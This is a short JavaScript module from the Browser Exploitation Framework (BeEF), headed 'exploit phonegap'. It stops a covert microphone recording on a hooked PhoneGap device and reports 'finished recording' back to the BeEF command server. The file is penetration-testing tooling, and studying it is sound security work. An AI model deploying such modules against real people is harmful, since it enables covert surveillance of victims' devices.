//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
// exploit phonegap
//
beef.execute(function() {
    m.stopRecord();
    // weirdly setTimeout and stopRecord don't seem to work together
    //milliseconds = "<%== @duration %>" * 1000;
    //setTimeout("m.stopRecord()", milliseconds);
    
    // so here is an ugly work around
    //start = new Date(); 
    //stop = start.getTime() + 5000; 
    //do { 
    //    current = new Date(); 
    //    current = current.getTime(); 
    //} while(current < stop) 
    //m.stopRecord();
    
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "finished recording");	
});
